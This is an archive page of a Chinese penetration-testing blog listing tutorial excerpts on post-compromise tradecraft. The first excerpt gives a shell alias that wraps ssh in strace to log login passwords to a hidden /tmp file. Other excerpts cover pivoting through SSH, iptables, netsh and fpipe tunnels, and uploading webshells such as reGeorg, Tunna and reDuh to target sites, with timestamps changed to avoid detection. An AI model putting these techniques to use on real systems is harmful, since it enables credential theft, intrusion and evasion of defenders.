<html>

<head>
    <meta charset="utf-8">
    
    <title>APT404-不疯不魔怎么活</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/favicon/favicon.ico">
    <link rel="stylesheet" href="/css/main.css">
    <link rel="stylesheet" href="/css/tagplugins.css">
    <link rel="stylesheet" href="/css/highlight.css">
    


    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="APT404-不疯不魔怎么活" type="application/atom+xml" />
    
</head>

<body>
  <div class="blog-header">
   <a id="menu-nav-icon"><img src="/image/menu.png"/></a>
   <div class="nav-container">
     <nav id="main-nav">
       
         <a class="main-nav-link" href="/">Home</a>
       
         <a class="main-nav-link" href="/archives">Archives</a>
       
     </nav>
   </div>
   <!--
   <div id="search-form-wrap">
     <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://apt404.github.io"></form>
   </div>
 -->
    <h1 class="blog-title">APT404-不疯不魔怎么活</h1>
    <p class="lead blog-description">在接下来的余生中,只做一件事,从 0 到 1</p>
</div>

  <div id='main-part'>
      
    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/23/strace/">利用Strace来跟踪 Ssh 登陆密码</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-23
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 前言<br>strace 本身其实是一个非常好用的系统调用跟踪工具,运维们可以通过它快速锁定问题的根源,但,恰巧我们也可以通过这种方式来跟踪任何进程数据,比如ssh,su,sudo,这里以跟踪ssh登陆密码为例,大家可自行脑洞更多其它用法,关于strace自身的选项作用,请<code>man strace</code>:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install epel-release -y   利用epel源来装,直接yum可能yum不到</span></span><br><span class="line"><span class="comment"># yum install strace -y		如果目标机器没有装strace,那你就自己顺手给他装一个,不过像这类的调试工具,一般都会作为常用工具而被预装</span></span><br><span class="line"><span class="comment"># vi ~/.bashrc 			注意,这里是当前用户的环境变量配置文件,也就是说它只能对当前用户有效,不过你也可以加到全局配置中 '/etc/bashrc'</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> ssh=<span class="string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="string">'`.log -s 2048 ssh'</span></span><br></pre></td></tr></table></figure>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/23/strace/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/strace/">strace</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/strace/">#strace</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/22/ssh-portforward/">通向彼岸 之内网代理转发 [ Ssh隧道 ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-22
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 此次用于实验的大致环境,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lnmp01 	[centOS6.8_x64] 	ip: 192.168.3.30  	假设为自己公网的vps[一般都会用一台公网的linux肉鸡],等会儿主要用来负责ssh转发</span><br><span class="line">MidLAMP [centOS6.8_x64] 	ip: 192.168.32.193	假设为目标内网中的一台linux机器,能正常连公网</span><br><span class="line">win2008cn			ip: 192.168.32.170	假设为目标内网中的一台windows机器,不能连公网</span><br><span class="line">win2008R2cn 			ip: 192.168.3.23	假设为目标公网中的一台windows机器,rdp只能通过192.168.3.x这个ip段访问</span><br><span class="line">win7en 				ip: 192.168.32.195	假设为自己本地内网中的一台windows机器</span><br><span class="line">win7en_bak			ip: 192.168.3.17	假设为自己公网的另一台windows机器</span><br></pre></td></tr></table></figure></p>
<p>0x02 关于ssh 工具本身选项用途简介 [更多详情,请自行man ssh,帮助手册里面说的非常详细]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-C  压缩传输数据,加快传输速度</span><br><span class="line">-f  后台对用户名密码进行认证</span><br><span class="line">-N  仅仅只用来转发,不用再弹回一个新的shell</span><br><span class="line">-n  后台运行</span><br><span class="line">-q  安静模式,不要显示警告等信息</span><br><span class="line">-l  指定ssh登录名</span><br><span class="line">-g  允许远程主机连接到本地转发的端口     </span><br><span class="line">-L  进行本地端口转发</span><br><span class="line">-R  进行远程端口转发</span><br><span class="line">-D  动态转发,即socks代理</span><br><span class="line">-T  禁止分配伪终端</span><br><span class="line">-p  指定远程ssh服务端口</span><br></pre></td></tr></table></figure></p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/22/ssh-portforward/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/ssh-portforwd/">ssh portforwd</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/ssh-portforwd/">#ssh portforwd</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/21/fpipe-redirect-port/">通向彼岸 之内网代理转发 [ 利用端口重定向Bypass各类应用层防火墙 Fpipe ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-21
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上[转发],再通过转到的这个本地端口去连远程机器的某个端口[管道],而不是像netsh只是单纯的把端口转过去,简易通信流程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外部端口访问 &lt;-&gt; 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) &lt;-&gt; 通过本地的另一个端口和远程机器的某个端口通信</span><br></pre></td></tr></table></figure>
<p>工具选项如下,非常简单,看选项说明基本就懂了:<br><img src="/img/fpipe help.png" alt=""></p>
<p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/21/fpipe-redirect-port/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/fpipe/">fpipe</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/fpipe/">#fpipe</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/19/iptables-portfward/">通向彼岸 之内网代理转发 [ 系统篇 Iptables ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-19
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</p>
<p>0x02 环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">边界linux机器(centos <span class="number">6.8</span>en) 		<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </span><br><span class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) 	<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </span><br><span class="line">攻击者机器(win7cn) 			<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></span><br></pre></td></tr></table></figure></p>
<p>0x03 最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过边界的linux机器访问内网中的windows机器上的指定服务</span><br></pre></td></tr></table></figure></p>
<p>0x04 具体过程如下,首先,编辑边界linux机器的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></span><br><span class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></span><br></pre></td></tr></table></figure></p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/19/iptables-portfward/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/iptabbles/">iptabbles</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/iptables/">#iptables</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/18/netsh-portfward/">通向彼岸 之内网代理转发 [ 系统篇 Netsh ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-18
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;除了前面提到的用一些端口转发工具来进行端口转发,其实windows系统自己也给我们提供了类似的功能,比如,其自带的防火墙管理工具<code>netsh</code>套件[确实非常实用],尤其碰到一些稍微畸形点的内网环境<br><br></p>
<p>0x02 先来假设这么一种情况<br>&nbsp;&nbsp;&nbsp;&nbsp;当你搞定边界的一台windows机器以后,上去一看发现,机器上有两块网卡,一块外网卡,一块内网卡[先暂以正常的DMZ来讲],这时又你通过别的方式搞定了同内网的另一台windows机器,本来以为简单的种上马就可以走人了,但你发现马执行以后似乎什么都没发生,搞了半天,你才发现,原来这台内网机器根本不能连外网,说到这里,相必你也应该知道我要干啥了,没错,虽然内网的那台机器不能连外网,但它起码能跟边界的这台机器正常通信,这就够了,我们可以直接从外部通过边界这台机器来访问内网的那台不能连外网的机器<br><br><br>0x03 演示简单环境如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标的边界机器[win7en] 				<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.212</span>  [假设为目标公网ip] <span class="number">192.168</span>.<span class="number">32.132</span>[目标内网ip]</span><br><span class="line">目标内网的那台不能连外网的机器[win <span class="number">2008</span>r2cn] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.134</span> [目标内网ip]</span><br><span class="line">外部的攻击者的机器[win7cn] 			<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.251</span></span><br></pre></td></tr></table></figure></p>
<p>0x04 要实现的目的很简单:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先,可以确认的是,边界机器和攻击者机器通信正常,边界机器和目标内网的那台不能连外网的机器通信正常</span><br><span class="line">现在,我想通过边界机器的某个端口去访问目标内网的那台不能上外网的机器的<span class="number">3389</span>,下面是具体的操作步骤</span><br></pre></td></tr></table></figure></p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/18/netsh-portfward/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/netsh/">netsh</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/netsh/">#netsh</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/17/http-tunnel-question/">通向彼岸 之内网代理转发 [ Http隧道篇 使用过程中容易出现的一些问题 ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-17
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>关于使用http隧道代理脚本时,容易出现的一些错误及解决办法</p>
<p>0x01 如果是php程序,你可能需要先确保php.ini中的socket模块已正常开启并且可用,因为php中的socket函数要基于此模块,不过,reGeorg早已经提供了不再需要开启socket的代理脚本</p>
<p>0x02 有时候你在绑定某些端口会遇到socket无法建立连接的问题,不妨尝试换一下端口,比如:53,8080,443,只要不跟目标系统中的现有端口冲突即可,尽量用一些穿透性比较好的端口</p>
<p>0x03 有时还会遇到aspx 运行错误,看具体是什么错误,如果一眼解决不了,谷歌一下,解决办法肯定一大堆,比如:’Compilation Error’,可以尝试在代理脚本[即webshell]的当前所在目录,另外新建一个web.conf文件,一般也即可解决,文件具体内容如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">  &lt;customErrors mode=<span class="string">"Off"</span>/&gt;</span><br><span class="line">  &lt;<span class="regexp">/system.web&gt;</span></span><br><span class="line"><span class="regexp">&lt;/configuration</span>&gt;</span><br></pre></td></tr></table></figure></p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/17/http-tunnel-question/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/http-tunnel/">http tunnel</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/http-tunnel/">#http tunnel</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/16/abptts-http-tunnel/">通向彼岸 之内网代理转发 [ Http隧道篇 Abptts ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-16
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;abptts,一款基于ssl加密的http隧道工具,相对来讲还算稳定,就个人实际使用来说起码比regerog都要稳定一些,且全程通信数据加密,能一定程度上对抗取证检测,单就这一点来说,还是很赞的,不过,加不加密,它自己说的不算,还是老办法,拿wireshark自己耐心跑一遍,就一目了然了,尽量用事实说话嘛 </p>
<p>0x02 首先,安装好工具所需的各种py依赖库:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># pip install pycrypto    加密库,整个通信数据加密基本都要靠这个库来实现</span><br><span class="line"># pip install httplib2</span><br></pre></td></tr></table></figure></p>
    <!-- Only display the Read More link if we are displaying an excerpt -->
    
        <p id="readmore">
            <a href="/2016/09/16/abptts-http-tunnel/">
                Read More >>>
            </a>
        </p>
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/http-tunnel/">http tunnel</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/http-tunnel/">#http tunnel</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/15/regerog-http-tunnel/">通向彼岸 之内网代理转发 [ Http隧道篇 reGeorg ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-15
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>reGeorg [基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</p>
<p>0x01 和前面都一样,先把代理[webshell]上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/regeorg_weshell_proxy.png" alt=""></p>
<p>0x02 连接绑定好的本地端口,推荐用proxifier或者sockscap,然后往里面添加一些自己常用的内网渗透工具,就可以对目标进行正常的内网渗透了<br><img src="/img/regeorg_weshell_proxifier.png" alt=""><br><img src="/img/regeorg_weshell_res.png" alt=""></p>
<p>0x03 实际渗透中,个人还是比较推荐用这个,比较稳定,使用也比较简单,不过,还是有些令人不太愉快的地方,待后期解决了,再单独拿出来说<br><br></p>

    <!-- Only display the Read More link if we are displaying an excerpt -->
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/http-tunnel/">http tunnel</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/http-tunnel/">#http tunnel</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/14/tunna-http-tunnel/">通向彼岸 之内网代理转发 [ Http隧道篇 Tunna ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-14
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>Tunna [实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]</p>
<p>0x01 依然是先把代理端[webshell]上传到目标的网站目录中,并尝试访问该webshell,返回正常后,即可在本地执行下面的语句:<br><img src="/img/tunna_client.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[3389] -v </span></span><br><span class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -a 内网机器的ip -r 内网机器的指定端口 -v  </span></span><br><span class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[22] -s[转发ssh服务需要加上此选项] -v</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/tunna_server.png" alt=""></p>
<p>0x02 先连接刚才绑定到的本地端口,在尝试用mstsc,putty等工具进行连接<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> 绑定的本地端口</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/tunna_server_res.png" alt=""></p>
<p>0x03 比较的不稳定,尤其是php脚本,已经不太兼容php5.3以后的版本了,而且还要开启某些模块(socket)支持,利用条件确实有点儿苛刻</p>
<p>0x04 另外,tunna已经有相应的msf模块,也可以选择直接把它加到msf中使用<br><br></p>

    <!-- Only display the Read More link if we are displaying an excerpt -->
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/http-tunnel/">http tunnel</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/http-tunnel/">#http tunnel</a>
</div>




</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2016/09/13/rehuh-http-tunnel/">通向彼岸 之内网代理转发 [ Http隧道篇 Reduh ]</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2016-09-13
        
            by klion
        
    </p>

    

    <!-- Content -->
    <p><br><br>关于http隧道:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,所谓的http隧道[更专业的叫法 “80端口复用”],你暂时可以把它简单形象的理解成基于web端脚本实现的一个socks代理功能,只不过这个代理不用在目标端再新开一个端口而是直接复用在已有的端口(通常是web服务端口,由相应的webshell实现)上:</p>
<p>reduh[老牌的http隧道工具,基于java,所以你需要事先装下jre]</p>
<p>0x01 首先,把代理端[即webshell]上传到目标的网站目录中,并尝试访问,返回正常后,在本地执行:<br><img src="/img/reduh_php.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># java -jar reduhclient.jar http://目标域名/reduh.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/reduh_php_clinet.png" alt=""></p>
<p>0x02 开始绑定端口,建立隧道<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># telnet 127.0.0.1 1010</span></span><br><span class="line">[createTunnel]要绑定到本地哪个端口上[<span class="number">8088</span>]<span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span>要绑定远程机器上的哪个端口[<span class="number">3389</span>,<span class="number">22</span>] </span><br><span class="line">[createTunnel]<span class="number">8088</span><span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">3389</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/reduh_php_create_tunnel.png" alt=""></p>
<p>0x03 隧道建立成功后,即可使用 mstsc,putty 等工具连接到本地绑定的端口[此处是绑定到本地的8088],当你访问本地的8088就相当于访问目标机器的3389[你也可以换成22,以及你想代理的任何端口,前提是目标的这个端口必须先开了才行]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></span><br><span class="line">putty <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/reduh_php_create_tunnel_success.png" alt=""></p>
<p>关于reduh:<br>&nbsp;&nbsp;&nbsp;&nbsp;工具已经非常老了,应该是在很早之前,reduh的官网就已经发过相关声明,称reduh项目已经不再维护,现在已经被更好用的regerog所替代,不过,你要是实在没办法,还是可以尝试用下这个的,实际测试中,个人感觉reduh要比tunna还要好用一点,其实,所谓的好不好,跟目标实际环境和代码本身都有很大关系,这个也没必要非要分个好赖,适合自己的就是最好的,有兴趣可以仔细去详读一下工具代码<br><br></p>

    <!-- Only display the Read More link if we are displaying an excerpt -->
    

    <hr />

    


<div class="blog-categories-container">
    <span><img src="/image/categoriesicon.png" alt=""/></span> 
    <a href="/categories/http-tunnel/">http tunnel</a>
</div>


    


<div class="blog-tags-container">
    <span><img src="/image/tagsicon.png" alt=""/></span>
    <a href="/tags/http-tunnel/">#http tunnel</a>
</div>




</div>
</div>




<div id="page-nav">
    <a class="extend prev" rel="prev" href="/page/9/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/11/">Next &raquo;</a>
</div>



  </div>
  <!-- Footer -->
  <div id="footer">
  <div id="footer-social">
    
    
    
    
    
    
</div>

  <p id="footer-info">
    &copy; 2018 APT-404<br>
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> -
    Theme <a href="https://github.com/Suolawangzai/hexo-theme-nebula" target="_blank">nebula</a>
  </p>

  <div id="busuanzi">
    <span id="busuanzi_container_site_pv">
      &hearts;
    Total visits: <span id="busuanzi_value_site_pv"></span>
    </span>
  </div>
  <!--
  <div id="footer-info">
    &copy; 2018 APT-404<br>
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
  </div>
-->
</div>

  <!-- After footer scripts -->
  <!-- Disqus Comments -->


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script src="/js/main.js"></script>

</body>

</html>
